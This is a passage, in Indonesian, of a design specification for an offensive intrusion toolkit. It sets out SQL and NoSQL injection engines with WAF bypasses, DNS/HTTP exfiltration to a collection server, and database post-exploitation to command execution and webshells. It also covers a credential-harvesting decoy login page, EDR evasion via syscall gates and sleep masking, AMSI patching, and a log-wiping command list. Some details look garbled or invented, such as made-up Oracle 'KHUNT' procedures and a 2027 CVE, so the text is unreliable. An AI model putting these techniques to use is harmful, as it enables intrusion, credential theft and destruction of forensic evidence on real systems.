- **EMAIL_RELAY_C2** — biasa 2-hop: SMTP (send command) + IMAP (read status) via tempat sampah/draft message; simpangan IMAP idle capability.
- **NTP_EPOCH_C2** — encode command dalam low-byte NTP request ke DNS tertentu (untuk air-gapped/egress-only environments).
- **RADIUS/ADFS_portal_front** — fronting via federasi SSO endpoint.

---

## 5. LAYER 2 — MALLEABLE PROFILE ENGINE + DECOY

### 5.1 Profile Engine

Modul: B.11 teknik transform default + 5 teknik header-spoof.

**Transform data** (tepat dari v3.2 tapi diperluas jadi executable spec):
1. **PREPEND** — sisip prefix byte (offsets) sebelum payload tampilan.
2. **APPEND** — sisip suffix byte setelah payload.
3. **PRINT** — string statis di posisi eksplisit (untuk isi field frekuensi).
4. **STRREP** — replace substring "MZ..." / "XYZ" di payload (post-encrypt).
5. **BASE64** — encode buffer saat transisi GET→body.
6. **PUT** — posisi byte exact (offset).
7. **URI_OBFUSCATE** — transform serve ke URI path random per variant; default 0x6aac.
8. **URI_APPEND** — terhadap operasi GET, append marker.
9. **HEADER_ORDER_OVERRIDE** — urutan header fields berbeda per profile.
10. **CASE_VARIATION** — metode path ke-kan-kanan acak walau server case-insensitive.
11. **TRANSFORM_CHAIN_ID** — tiap implant referensi blueprint transform (B-001..B-050) yang dipakai; profile tidak terkirim utuh (countRef).

**Profile per-destination** (untuk niru produk nyata):
- `teams` — Header: content-type multipart/form-data; UA Edge; urutan sound fits; path /api/telemetry/...
- `office365` — UA Chrome; path /owa/health; cookies session-id.
- `google` — UA Chrome; data URI pattern; headers Client-Data dari Chrome.
- `cloudflare` — proxy header X-Worker; TLS profile Cloudflare edge.
- `amazon`, `apple`, `microsoft-cdn` custom (extra).

**HTTP/2 + TLS** turunan di Section 4.2 (PROFILE_TLS).

Validasi otomatis per build: `profile-validator --check` membandingkan ja3/h2/order vs target tanpa implant (self-probe).

### 5.2 The Decoy (deception)

Modul:
1. **HIGH_FIDELITY_ASSETS** — front mock Teams/Office/Google statis, respon realistic (status codes, redirect chains, favicon, headers).
2. **HONEYUSER_HOOKS** — login form harvesting (username/password/2fa token) + logging visitor (IP, UA, Referer, timing).
3. **SCANNER_TARPIT** — NMAP/nuclei probes diarahkan ke metode "slowloris" port (buang waktu scanner, sembunyi dari peta).
4. **CANARY_TRAP** — pasta file decoy (jangan sentuh), trigger alert saat dibuka; dipakai EDGE-01 dan puzzle attribution.
5. **URICHECK_404** — visitor tanpa token → decoy/404; token valid → /api/v1/* ; operator → /admin/*; rate-limit 5/min; IP whitelist.
6. **GEO_FAIL** — negara bukan target → tampilkan "maintenance" (mencegah pemeriksaan dari luar scope).
7. **SERVICE_BANNER** — nginx 1.24.0 / openresty spoof, version dated realistic.

Fallback: header-token-validate → route → scan case → decoy → tarpit → alert.

Env: dari client hello + UA langsung diketahui browser/scanner/proxy; adaptasi serve.

Test + docs (ringkas):
```
D-01  valid agent token → 201 di /api/v1   ; EXP: route hit
D-02  spoofed token → decoy 404 yang sama  ; EXP: tidak ada diff perbesan
D-03  nmap full connect → tarpit (koneksi tetap, no banner leak)
D-04  login form harvest → events masuk evidence ledger (PII-redacted)
D-05  decoy vs profil TLS: ja3 decoy harus cocok vs Chrome asli
D-06  rotasi profile (TLS update) → validator lolos (iterasi build ulang)
```

**Extra tools (L2):** JAVASCRIPT_DEADEND — false "admin" SPA yang melempar error; FAVICON_HASH_DECOY — set hash favicon yang tidak ada di virustotal; TYPOS-QUATRE-DECOY.

---

## 6. LAYER 3 — SQL INJECTION ENGINE

### 6.0 Struktur

```
sqli/
├── detectors/     # 8 + 3 baru (fungsi bool/time/error/union/stacked/oob/order)
├── payloads/      # per-DBMS (mysql, pg, mssql, oracle, sqlite, db2, informix, access)
├── waf_bypass/    # 14 encoder + HPP + belajar-algo
├── exfil/         # dns, http, icmp, prisma, siem (timestatus-blind stream)
└── engine/        # scheduler (parallel, K-coroutine) + parser + result
```

### 6.1 Detectors (11 teknik)

B1. **ERROR_BASED** — `EXTRACTVALUE/UPDATEXML` (MySQL), `CAST(... AS int)` (PG),
   `CONVERT` (MSSQL), `dbms_xdb_versioning` (Oracle), parse error verbosity.
B2. **BOOLEAN_BLIND** — true/false differential; binary-search karakter (log2)
   dan parallel probe K per halaman (K=tersedia concurrency).
B3. **TIME_BASED** — `SLEEP()`/`pg_sleep`/`WAITFOR DELAY`/`DBMS_LOCK.SLEEP`;
   ambang dwi-sampling (baseline 3x agar tidak noise false-positif).
B4. **UNION_BASED** — ORDER BY discovery kolom; col-null-padder; data jenis string.
B5. **STACKED** — eksekusi query kedua; gerbang ke syscall-level ops (L5).
B6. **OOB_DNS** — `LOAD_FILE('\\\\<id>.dnsc2\\')`, `UTL_HTTP`, `xp_dirtree` — exfil chunk base32 per query; resolver di tim DNS receiver.
B7. **OOB_HTTP** — `UTL_HTTP.REQUEST` / `curl` via DB — exfil ke collect server.
B8. **OOB_ICMP** — tunneling payload di ICMP si DB server (jika os-shell DB).
B9. **ORDER_BASED** — ORDER BY injection untuk inferensi tanpa op (blind, no time).
B10. **ERROR_SQLITE_CARRIER** — injection di query yang memicu "database is locked"
     — sinyal siluman untuk blind timing pada path yang tidak blok.
B11. **COMPOUND_OR** — injeksi `OR 1=1` dengan response-differential yang
     dibedakan dari request valid (fast path validation).

FALLBACK (per DBMS, akurasi cepat):
```
error → boolean → union → stacked → oob_dns → oob_http → time → oob_icmp
(lambda-window: time terakhir karena butuh baseline latency tinggi di lapangan)
```

### 6.2 Payload per DBMS (teknik khas)

| DBMS | Teknik kunci |
|------|--------------|
| MySQL | `@@version`, `database()`, `user()`, `into outfile` → webroot, `load_file`, UDF (L5), `\N` NULL bypass |
| PG    | `current_database()`, `pg_sleep`, `COPY TO PROGRAM` (L5), `pg_read_file`, `dblink` |
| MSSQL | `db_name()`, `WAITFOR`, `xp_cmdshell` (L5), `bulk insert` file read, `sp_who` |
| Oracle| `dbms_pipe`, `utl_http`, `xmltype` OOB, Java stored proc (L5), `listagg` dump |
| SQLite| `sqlite_master`, `ATTACH` (multi-db exfil), `load_extension` (RCE via so) |
| DB2   | `VALUES`+`SYSIBM.SYSDUMMY1`, fncextension |
| Informix| `Fnc.dll` sysproc |
| Access| `iif` boolean + `Mid` extraction |

### 6.3 WAF Bypass (16 teknik)

W1 HEX, W2 CHAR(), W3 Unicode `%u0053`, W4 double-URL, W5 case, W6 comment
`/**/`, `/*!50000*/`, W7 whitespace set (`%09 %0a %0b %0c %0d %a0`), W8 JSON body,
W9 GraphQL param, W10 XML param (cdata wrap), W11 multipart boundary-race,
W12 UA rotate, W13 **HTTP PARAMETER POLLUTION (HPP)** — duplikasi param:
   `?id=1&id=1' OR '1'='1` → backend gabung via concat; log WAF lihat "1".
W14 **MOVED_TO_BODY** — param di body tapi WAF cuma scan URL.
W15 **USE_IPV6/OCTAL-IP** — host header / parameter encoding varian.
W16 **PROTO_SMUGGLE_ALIGNED** — request smuggling (L20) untuk memotong WAF,
     injeksi di request kedua yang lewat backend.

FALLBACK: W1→W2→W6→W13→W3→W5→W7→W12→W8→W9→W10→W11→W14→W15→W16→ALERT.
(urutan ditentukan pakai fingerprint WAF: hasil ENV_DETECT ekstensi S-13 WAF probe:
Cloudflare vs AWS WAF vs Akamai vs ModSecurity punya pola error/gap sendiri.)

### 6.4 Environment/Adaptasi

- DBMS typefingerprint via banner + error charset → pilih payload set.
- WAF detect via challenge page/UA block pattern → pilih bypass order.
- Time-based dihindari bila latensi jitter tinggi; prefer boolean/dns.
- Rate-limit awareness: request/second di-throttle & di-randomize.

### 6.5 Resilience (10 edge case → respon singkat)

```
EDGE-01 sig baru: WAF update → refresh waf_fp; scribble ke undetected bypass set
EDGE-02 endpoint blok: pindah ke endpoint clone / path encoding
EDGE-03 payload quarantine: (server side) tidak berlaku LANGSUNG; implosikan
EDGE-04 token/session hang: re-auth via cred store, refresh session
EDGE-05 cred rotate: tunggu login baru, ulangi dari L5 grab
EDGE-06 segment move: re-discover DB endpoint, re-route proxy
EDGE-07 operator offline: queue hasil, lanjut blind-extract mandiri
EDGE-08 DMS: stop extraction pipeline, purge payloads dari memori
EDGE-09 self-destruct: hapus temp file parser, wipe cache extract
EDGE-10 forensik/reboot: bersihkan error log yang bisa di-trace; lanjut post-boot
```

### 6.6 Test

```
S-01 MySQL boolean blind 1 char di name (env: MariaDB 10.11, P0) → char benar
S-02 PG time-based (CVE-2027 pg 15) → 5s delay valid
S-03 MSSQL stacked + xp_cmdshell soft (tidak eksekuti) backdoor check
S-04 Oracle OOB DNS → resolver menerima chunk base32
S-05 WAF (ModSecurity CRS on OWASP) → HPP bypass 4/6 verifikasi
S-06 Full chain SQLi → file read → UDF → cred | iterasi 3 set (flag deviate)
S-07 butuh wiring: kontainer engine sql_i tidak crash saat 10 source parallel
```

### 6.7 Cara pakai

```
sqli scan https://tgt/intro?a=1           # auto: detect→chain
sqli --dbms mysql --technique union --dump tbl
sqli --waf cloudflare --bypass hpp,body2 # pastikan order bypass
sqli --exfil dns --dns-server 1.1.1.1:53 --chunk 60
```

### 6.8 Extra tools tambahan

- **PRISMA/FMK blind-stream**: exfil via timing-binary di satu query (for WAF blocking OOB).
- **SQL_REPLICA_STALK**: cek replication topology, injeksi di replica (latency lebih longgar, WAF sering terlewat).
- **GUI_AUTOFILL_CARRIER**: aktifkan autofill → baca hasil dari UI (XSS-less path).

---

## 7. LAYER 4 — NoSQL INJECTION ENGINE

### 7.0 Cakupan DBMS diperluas dari v3.2: MongoDB, Elasticsearch, CouchDB,
Redis, Cassandra **+ 4 baru**: DynamoDB, Neo4j, Firestore, ArangoDB.

### 7.1 MongoDB (7 teknik)
M1 **AUTH_BYPASS_OP** — `$ne`/`$gt`/`$regex` di payload login.
M2 **AUTH_BYPASS_JSON** — operator didalam JSON body (`{"user":{"$ne":null}}`).
M3 **BOOLEAN_BLIND** — `$where` regexp true/false oracle per karakter.
M4 **TIME_BASED** — `$where` + sleep JS (spawn block) with baseline.
M5 **JS_INJECT** — server-side JS via `$where`/`mapReduce`/`agg pipeline` ($fn)
   → RCE jika sandbox longgar (kontrak L5).
M6 **LOOKUP_EXFIL** — `$lookup`/`$unwind` chain ke collection lain; exfil lewat
   difference aggregation.
M7 **ERROR_BASED** — malformed operator → mongo trace verbose (version leak +
   > sering backend query dump).

FALLBACK: M1→M2→M3→M7→M4→M5→M6.

### 7.2 Elasticsearch (5)
E1 **QUERY_DSL_INJECT** — `term`/`bool`/`range` injection.
E2 **AGGREGATION_EXFIL** — bucket+sig aggs baca field tersembunyi.
E3 **SCRIPT_INJECT** — Painless via `script_fields` (systemcall risk),
   `_search` runtime_mappings.
E4 **OPEN_SOURCE_BYPASS** — index dengan `mapping` sumber kebocoran via `_msearch`.
E5 **XDLP_TERMS** — `_async_search`/`_qa` endpoint untuk exfil chunk besar.

FALLBACK: E1→E2→E3→E4→E5→alert.

### 7.3 CouchDB (+3)
C1 **AUTH_BYPASS** — `_users`/`_session` expired-cookie slide; cookie-less replication cookie grab.
C2 **JS_INJECT** — `_design` views dengan `map` berbahaya (RCE via os-cmd bila
   sandbox sebelumnya; modern Node VM mungkin block — fallback ke C3).
C3 **RAW_PARTIAL_REPL** — `_replicator` document inject → data ditarik keluar tanpa
   auth penuh (mimimi replication).
C4 **ATTACH_EXFIL** — attachment `_attachments` exfil.
C5 **ADMIN_HTTP_ABUSE** — endpoint `_config` PUT saat admin default "admin:" lolos.

FALLBACK: C1→C3→C5→C2→C4.

### 7.4 Redis (4)
R1 **CMD_INJECT** — raw command via client (CONFIG SET dir, `SSET` shell).
R2 **KEY_DUMP** — dump pattern, `KEYS *`, `MEMORY USAGE` gating.
R3 **LUA_SCRIPT** — EVAL RCE (evalsha) macro/exfil.
R4 **AUTH_BRUTE** — default `requirepass` weak, `INFO` leak.

FALLBACK: R1→R3→R2→R4.

### 7.5 Cassandra (2 + 1)
K1 **CQL_INJECT** — WHERE clause operator (allow filter bypass).
K2 **USER_EXTRACT** — `system_auth.roles` dump (password hash).
K3 **SASL_MECH_BYPASS** — mech negotiation downgrade (riptide).

### 7.6 ADDON DBMS (4) — extra tools
D1 **DynamoDB** — `PartiQL` injection (attribute_not_exists bypass); IAM role scan.
D2 **Neo4j** — Cypher: `WHERE (1=1)`, `UNWIND` parametrik escape, apoc.util.sleep timing.
D3 **Firestore** — REST query param (`orderBy` noSQL), existence oracle via `limit`.
D4 **ArangoDB** — AQL injection, `LENGTH()` timing oracle, `_api/simple` wildcard.

### 7.7 Fallback silang
```
Mongo(M1-M7) → CouchDB(C1-C5) → ES(E1-E5) → Redis(R1-R4) → Cassandra(K1-K3)
→ DynamoDB → Neo4j → Firestore → ArangoDB → ALERT
```

### 7.8 Env/Adaptasi
- TCP/HTTP style per DBMS deteksi banner/handshake; operator pilih trimspeed.
- Replica hop & ID; tiap DBMS dapat token kalau masih anonymous.

### 7.9 Test & Usage
```
N-01 Mongo $ne auth (env Mongo 7, replicaSet) → bypass low-priv entry
N-02 ES Painless cpu_time leak (2026) → field baca
N-03 Redis EVAL RCE → `id` output
N-04 CouchDB _users unauth → role dump (P1)
N-05 DynamoDB PartiQL ≠ flag (simulasi boto3 patched)
N-06 Neo4j blind (no UI) → version infer (timing oracle)
Usage: nosql probe tcp://tgt:27017 --engine mongo --technique auth_bypass
```

---

## 8. LAYER 5 — DATABASE POST-EXPLOITATION

### 8.1 Oracle (6 chain + 2)
O1 **JAVA_OBJ_INJECT** — `CREATE OR REPLACE` Java stored procedure;
   compile server-side `DBMS_JAVA` → array vulnerability (XE pre-2021).
O2 **KHUNT_CMD** — prosedur khunt (renamed dbms_system) command execution chain.
O3 **KHUNT_HASH** — khunthash: ctx->pwbordesign hash extraction & crack pivot.
O4 **KHUNT_FS** — khuntfs: filesystem read over stream.
O5 **KHUNT_UNZIP** — payload unpack & write in-place (no temp crud).
O6 **REG_DUMP** — registry read via `DBMS_SYSTEM` (Windows host).
O7 **UTL_HTTP/UTL_FILE** — OOB exfil + file write alternate.
O8 **DBMS_SCHEDULER_JOB_FIAT** — schedule os command (persistence mid-DB).

FALLBACK: O1→O2→O3→O4→O6→O7→O8→alert.

### 8.2 MySQL (5)
U1 **UDF_INSTALL** — compile `sys/eval` plugin `lib_mysqludf_sys`, write via `into outfile` → plugin dir.
U2 **USER_EXTRACT** — `mysql.user` hash (caching_sha2, mysql_native) dump.
U3 **FS_ACCESS** — `LOAD_FILE` any read; `INTO OUTFILE` controlled write.
U4 **GENERAL_LOG_PIVOT** — set `general_log_file` → webroot; log injection → webshell (classic file write).
U5 **INIT_FILE_PERSIST** — `init_connect`/`init_file` server start payload.

FALLBACK: U1→U3→U4→U5→U2→alert (urut: RCE > file > persist > cred).

### 8.3 PostgreSQL (5)
P1 **COPY_PROGRAM** — `COPY ... TO PROGRAM 'id'` RCE.
P2 **PG_SHADOW** — `pg_shadow` password hash + crack.
P3 **FS_READ/WRITE** — `pg_read_file`; `COPY ... TO '/tmp/x'` write.
P4 **LO_IMPORT** — `lo_import` read arbitrary file (via oid).
P5 **EXTENSION_MAL** — `CREATE EXTENSION` custom .so (RCE jika superuser + dll path open).

FALLBACK: P1→P5→P3→P4→P2.

### 8.4 MSSQL (5)
Q1 **XP_CMDSHELL** — enable sp_configure, exec.
Q2 **CLR_ASSEMBLY** — `CREATE ASSEMBLY` abusing UNSAFE (C# exec), bypass disabled cmd.
Q3 **SQL_LOGINS** — `sys.sql_logins` hash extract.
Q4 **BULK_READ** — `OPENROWSET BULK` file read.
Q5 **LINKED_SERVER** — jump ke server lain (lat pivot), `sp_addlinkedserver`.

FALLBACK: Q1→Q2→Q4→Q5→Q3.

### 8.5 Common (5)
C1 **BACKUP_ENUM** — locate backups (fileshare, VSS, 3rd-party agent), pgnote untuk L13.
C2 **VAULT_CRED** — env secrets, connection strings, app config parse.
C3 **ADMIN_PERSIST** — create shift user w/ DBA role (AP event sync).
C4 **PRIVILEGE_MAP** — grant analysis; target escalation chain.
C5 **RECOVERY_MODE_LOCK** — set db recovery simple / drop scheduled job (link L13 impact).

### 8.6 Fallback silang
```
Oracle→MySQL→PG→MSSQL (sesuai DBMS yg ditemukan) → setelah OS-shell didapat:
routes: shell→L6 evasion→L11 cred→L8 lateral. Emit event dbrexploit.result.v1
```

### 8.7 Env/Adaptasi
- Version-probe via `SELECT @@version` etc → pilih UDF/signature yang cocok.
- Privilege probe sebelum serang (mis. `SHOW GRANTS`), hindari waste.
- Socket vs TCP per OS → endpoint discovery via L17 port scan.

### 8.8 Test
```
D-01 Oracle khuntcmd (XE pre-2021) → id
D-02 MySQL UDF sys_eval → whoami (mariadb 10.6 secure-file-priv=0)
D-03 PG COPY TO PROGRAM (pg 14, superuser) → id
D-04 MSSQL CLR assembly (SQL '19) → whoami (disable cmdshell case)
D-05 CV-vault grab (env: app using AWS RDS cred) → attach + rotate
D-06 backup enum → file list + size (bcakup grand for L13)
```

### 8.9 Usage
```
dbpost --dbms oracle --chain khunt
dbpost --dbms mssql --tech clr --assembly unsafe_exec
dbpost --dbms pg --tech copycmd --cmd "id > /tmp/x; ..."
dbpost common --backup-enum --vault-cred --admin-persist --dry
```

### 8.10 Extra tools tambahan
- **SQL_CRED_BEACON** — semafor cred feed ke L11 store (cred) otomatis.
- **DB_SYNCH** — compare server time & tz utk timing-safe payload.
- **ORAPWN_LITE** — expired-AWM (autonomous) canary.

---

## 9. LAYER 6 — EVASION & STEALTH (KERNEL-LEVEL)

> Layer terpenting. Standar ref: Ekko/Foliage/Cronos/DeathSleep (sleep),
> Hell's/Halo's/Tartarus/FreshyCalls/SysWhispers3 (syscall), AMSI/ETW genital,
> unhooking 4 jalur, anti-analysis lengkap + adaptasi EDR by nama.

### 9.1 Modul SLEEP_MASK (11 teknik — chain penuh)

T1 **EKKO** — sleep via event handle:
```
1. NtCreateEvent(0) → event handle
2. NtWaitForSingleObject(hEvent, TRUE, timeoutMs)  ← "sleep"
3. callback routine (TIMER, PAS) di-execute (mask body saat ASYNC)
4. setelah wake → unmask & lanjut
API map: NtCreateEvent/NtWaitForSingleObject direct (syscall)
Anti-pattern: ETW gak nge-track (tubeless wait), stack clean.
```

T2 **FOLIAGE** — manipulasi ETW:
```
1. NtQueryInformationProcess (0x46/ProcessUserVa) → WerBlink map
2. patch provider bits (EtwEventWrite system_call_encryption)
3. sleep dgn callback; re-enable ETW state setelah wake
Detected: ETW provider disable = alert → fallback T1/T3.
```

T3 **CRONOS** — APC-based:
```
1. target thread alertable; queue APC (NtQueueApcThread)
2. sleep jalan sebagai alertable wait
3. APC wake → unmask → resume
Stack spoofing di APC context (kerja T7).
```

T4 **DEATHSLEEP** — thread context sandiwara:
```
1. simpan context (GetThreadContext)
2. set RIP → gadget sleep (NtDelayExecution stub)
3. jalankan; context asli di restore saat wake
Kunci: shadow stack (kernal CET) → bypass dengan shadow-stack-normalisasi
  (set STKADJ cookie bila CET active — itu yang bikin ini advance).
```

T5 **VIRTUALPROTECT+RC4** — encrypt-in-place:
```
1. VirtualProtect(page, PAGE_NOACCESS) → memori tak ter-baca (dump anti-forensik)
2. RC4/AES encrypt sleep region; handle WRITABLE (R/W)
3. VirtualProtect(PAGE_READWRITE) → decrypt → execute
Detected: NtProtectVirtualMemory pattern → fallback T6.
```

T6 **THREAD_STACK_SPOOF** — 
```
1. buat fake stack frame (legit callstack dummy — niru baseline windows)
2. switch RSP; build deep fake return-address chain
3. sleep di fake stack; restore original
Varian: "stack spoof on sleep" vs "on syscall" (untuk indirect gate L9.2).
```

T7 **EXCEPTION_HANDLER** — 
```
1. install VEH handler (RtlAddVectoredExceptionHandler)
2. trigger INT3/guard-page fault → transfer ke handler → handler sleep
3. resume ctx via handler return (RtlRestoreContext)
Carian VEH chain → anti-pattern? gunakan SEH asli (VEH+SEH hybrid).
```

T8 **MODULE_STOMPING** — 
```
1. LoadLibrary(mshtml/jscript) → region .text legit
2. overwrite .text dengan shellcode (VirtualProtect RWX → RX)
3. execute & sleep dari sana; page tampak modul asli (40 untuk api set)
```

T9 **CALLBACK_BASED** — 
```
1. QueueUserAPC / TimerQueue / RegisterWait / WorkItem (callback loop)
2. sleep di dalam callback routine (natural)
```

T10 **GUARD_PAGE_REMOVE** — 
```
1. set PAGE_GUARD pada region; trigger fault → handler (T7)
2. remove PAGE_GUARD pasca sleep → normal
```

T11 **ENCRYPT_FRAGMENTS** — 
```
1. pecah payload jadi N fragmen blendaran
2. tiap fragmen kunci AES-256 berbeda; decrypt-on-exec + re-encrypt-on-sleep
3. .NET/EKm none tersisa (self-mod)")
```

**FALLBACK CHAIN (dipilih ADAPTER 9.6):**
```
EKKO → FOLIAGE → CRONOS → DEATHSLEEP → VP+RC4 → THREAD_STACK_SPOOF →
MODULE_STOMP → CALLBACK → EXCEPTION_HANDLER → GUARD_PAGE → ENCRYPT_FRAG
(setiap teknik yg "detected" di TECH_LEDGER skip; chain minimum sukses 1)
```

**ENV/ADAPTASI:**
- CET enabled + CFG → DEATHSLEEP shadow-stack normalize / STACK_SPOOF_T6 tanpa CET.
- ETW patched → skip FOLIAGE; pakai EKKO/DEATHSLEEP.
- HW breakpoint flags DR0-7 → purges sebelum sleep; recovery via T7.
- Signature scanning di .data? → pakai encrypt-fragments + free-page scrub.

**Test:**
```
EV-01 Ekko 1m sleep no EDR trip (CrowdStrike Falcon) → checkin sukses
EV-02 Foliage ETW re-enable → trace tidak terkoyak (Sysmon event patched TRUE)
EV-03 DeathSleep+STKADJ (Win11 24H2) → session survive CET
EV-04 VP+RC4 → dump rdp memory selama sleep → hampa (no plaintext)
EV-05 10k iter → stability (no crash, no handle leak) 
EV-06 cross-arch: x64 only init, wow64 no sleep-mask
```

### 9.2 Modul SYSCALL (8 teknik — gate)

G1 **HELL'S_GATE** — walk PEB→Ldr→InMemoryOrderModuleList → ntdll base →
   parse export → SSN from stub (0xB8 mov eax,imm). Execute direkt.
```
asm: mov r10,rcx; mov eax,ssn; syscall
```
G2 **HALO'S_GATE** — ret-address heuristic: jika prologue hooked (E9/E8/FF25),
   skip trampoline & scan+0x10 region untuk stub asli; SSN dari stub bersih.
G3 **TARTARUS_GATE** — build 9-byte trampoline di memory RW (mov r10;mov eax;syscall;ret),
   redirect RSP ke sana (return-to-your-own-gate).
G4 **FRESHYCALLS** — dynamic SSN table build runtime (semua Nt*), skip hardcode;
   pakai per-Windows-build table (offset drift auto-fit).
G5 **SYSWHISPERS3** — generate .h/.asm semua syscall; linker static; indirect
   variant (jalankan melalui stub ntdll asli → return redirect ke syscall insn).
G6 **INDIRECT_SYSCALL** — call legit ntdll stub (hook lewat), set return-address
   → syscall instruction di stub; hook hanya "lihat" call masuk, syscall
   dieksekusi oleh ring-core.
G7 **RECYCLED_GATE** — pin memori di stub legit; modif RCX/RDX param; call; restore.
   Gain: no alloc, no W^X switch.
G8 **SOFTWARE_BREAKPOINT_GATE** — patogen anti-EGH: syscall via SIGTRAP sintetis
   (breakpoint-then-resume) ketika DWARF pada EDR berdasarkan breakpoint user-mode.

**FALLBACK:** G1→G2→G4→G6→G5→G3→G7→G8 (CEP bikin order: signature vs user-hook).

**ENV/ADAPTASI:** pengukuran hook scan tiap beacon; jika event "new hook on NtProtectVirtualMemory"
 masuk ke ledger → pindah indirect (G6). EDR yang monitor call-mask (etw syscall)
 → pakai gate yang tidak sinkron ETW write (G8). Build-version matcher.

**Test:**
```
EV-10 Hell's Gate 9 syscall (NtAllocate, NtWrite, NtCreateThread, NtProtect)
      no hook trip di sysmon
EV-11 CrowdStrike indirect (G6) run → 0 deteksi (referensi: de facto CA hook set)
EV-12 FreshyCalls SSN correctness vs debugger stub 6 syscall (Win10 22H2)
EV-13 build regression: Win11 23H2 → 24H2 table auto-migrate
EV-14 Recycled no W^X → no RWX page visible di ETW alloc trace
```

### 9.3 Modul AMSI/ETW (6 teknik)

A1 **HARDWARE_BREAKPOINT_AMSI** — patch via HWBP: set DR0 pada AmsiScanBuffer
   body, handler saat trap → set eax=AMSI_RESULT_CLEAN (return 0), continue.
   Tidak menulis byte → tidak terlihat oleh integrity-scan patch signature.
A2 **IN_PROCESS_PATCH** — overwrite AmsiScanBuffer prologue dengan `mov eax,0; ret`
   (0xB8 0x00 0x00 0x00 0x00 0xC3). Diketahui AV, tapi cepat & universal.
   Sync dengan unhook AmsiScanBuffer dari amsi.dll (restore copy dari disk).
A3 **REGISTRY_DISABLE** — HKLM\SOFTWARE\Microsoft\AMSI\Feature\DisableAMSI=1
   (untuk process baru; perlu Lokal System/Administrator). + Blue team catat.
A4 **SESSION_HIJACK_READ** — swap handle/context: mint token via DuplicateToken,
   spawn process di session dengan AMSI yang sudah dinonaktifkan via policy.
A5 **VEH_TRAMPOLINE** — install VEH yang intercept-scan-by-return: saat
   AmsiScanBuffer dipanggil, VEH men-simulasikan clean result (mirip A1 tanpa HW).
A6 **CLR_HOOK** — jika stack adalah .NET: between-JIT (host CLR) patch
   `AmsiInitialize`/`System.Management` bypass via C# AppDomain hook (aman-in-CLR).
   (SWEET: bypass even ke VBA macro engine.)

**FALLBACK:** A2→A1→A5→A6→A4→A3.
**ENV/ADAPTASI:**
- .NET implant → PREFER A6 (CLR) + A2 (proses patched).
- Native implant + EDR anti-prologue-scan → prefer A1 (HW) / A5 (VEH).
- AMSI di-lock via ransomware-protection driver? → A4 session hijack (no write).

**Test:**
```
EV-15 A2 amsi patch: PowerShell Invoke-Mimikatz-like string → clean scan
EV-16 A1 HWBP: amsi benchmark 100 strings → 100% clean (return-path correct)
EV-17 A4 session: backup in non-elevated → scan role revoked
EV-18 A6 CLR hook: .NET assembly (mal) load invisible ke AMSI unaudited
```

### 9.4 Modul UNHOOK (4 jalur)

N1 **NTDLL_CLEAN** — map ntdll bersih dari di-disk (NTAPI no "no such file"
   loader trick) → copy prologue bersih ke region our module, hook bypass.
   (pakai fresh ReadFile + PE header copy, bukan LoadLibrary lama; SSN tetap).
N2 **KERNEL32_CLEAN** — sama untuk kernel32 (Jika EDR hook CreateProcess etc).
N3 **KNOWN_DLLS** — abuse KnownDlls section (imagebias): peta section sistem
   yang semula tidak hook → copy jadi base kita.
N4 **MANUAL_MAPPED_UNHOOK** — gambarkan ntdll ke blok private (manual map,
   no PEB module entry), residency 'gambar' maupun section link — invisible
   ke enumerasi module scan.

**FALLBACK:** N3 (paling bersih, tanpa file touch) → N1 → N2 → N4 (terakhir, 
  footprint tinggi tetapi stealth dari vector enum).

**ENV/ADAPTASI:** jika EDR set "protected non-paged pool" (yagub FG) → N3/N1
  gagal → N4 (private mapping tidak tersentuh pool).

### 9.5 Modul ANTI-ANALYSIS (array lengkap)

**Anti-debug (daftar 8):**
1. PEB.BeingDebugged check + patch-self
2. CheckRemoteDebuggerPresent
3. NtGlobalFlag (0x70) detect + normalize
4. Hardware BP (DR0-DR7) detect+purging
5. Timing RDTSC / QueryPerformanceCounter drift > 100ms
6. Trap flag (single-step via SetThreadContext TF) detect
7. Heap: PEB.ProcessHeap.Flags 0x40000060
8. Debug object / NtQueryInformationProcess(0x1E)

**Anti-VM (list 8):** CPUID hypervisor bit, MAC prefix, registry keys,
driver list (vmci/vboxguest), SMBIOS vendor/BIOS string, disk model
(VMWARE/VBOX/QEMU), process (vmtoolsd, VBoxService), hypervisor node via
RDTSC-pin, WMI query CIM.

**Anti-sandbox (list 6):** uptime < 5m, mouse movement, disk < 60G,
cores < 2, RAM < 2G, process count < 30, + Cuckoo/Firejail/Wine artifact,
+ "kernel-has-beens" sandbox-host pid cache.

**Anti-EDR list (4):** module enum (find our binary not in list → seeded),
service enum, hook detect (G2 scan), ETW provider scan, + File minifilter
enum (fltmc) untuk deteksi kernel callbacks (detail L6 evasion only).

**Log cleanup (set 13):**
```
wc1 wevtutil cl System/App/Security
wc2 audit rule purge (auditpol /clear)
wc3 USN journal delete (fsutil usn deletejournal)
wc4 Prefetch dir purge
wc5 shell history (PowerShell PSReadLine, bash history)
wc6 Recycle bin drain + free space
wc7 AmCache/ShimCache entry rem (reg delete via pagedata)
wc8 eventlog "trusted installer" trick (srv regist no remote-forward) 
wc9 VSS shadow delete (before forensic copies)
wc10 SCCM client cache purge
wc11 browser history/DPAPI filter (jika target browser kami)
wc12 SRUM (System Resource Usage Monitor) cleanup drill
wc13 Scheduler Job history drop
```
Urutan darurat: wc1→wc3→wc2→wc4→wc5→wc7→wc9→wc12 (sisanya sesuai target).

**Network evasion L6 (kombinasi L23):** IP rotate, proxy chain, UA rotate,
TLS fp rotate (Section 4.2), DNS rotate (label randomize), VPN (mesh L16).

### 9.6 Modul ADAPTASI EDR (decision table lengkap)

```
| EDR                    | sleep_choice      | gate_choice | amsi_choice   | unhook |
|------------------------|-------------------|-------------|---------------|--------|
| CrowdStrike Falcon     | EKKO/DEATHSLEEP   | DIRECT+SDRA | VEH (A1/A5)   | N3/N4  |
| SentinelOne EDR        | CRONOS (APC)      | INDIRECT    | A1 (HW)       | N3/N1  |
| MS Defender (Online)   | VP+RC4 (hide)     | INDIRECT    | A2+A4         | N1/N4  |
| Carbon Black          | EKKO              | DIRECT      | A2            | N1     |
| Intercept X/XDR Palo  | DEATHSLEEP+STKADJ | RECYCLED    | A5            | N4     |
| Sysmon               | T7 exception      | INDIRECT    | A1            | N3     |
| Symantec/Broadcom     | CRONOS            | DIRECT      | A3 reg        | N1     |
| Bitdefender          | FOLIAGE-free      | G8 SWBP     | A2            | N1/N3  |
| Kaspersky KSOS/EDR    | DEATHSLEEP        | G4 Freshy   | A6 CLR        | N4     |
| (TCSI) no EDR         | default EKKO      | G1 Hell's   | A2            | N3     |
```

### 9.7 Modul PROCESS_INJECTION (8 teknik)

I1 **CRT** — CreateRemoteThread. I2 **APC** — QueueUserAPC. 
I3 **HOLLOWING** — NtUnmapViewOfSection → map self image → SetContext/Resume.
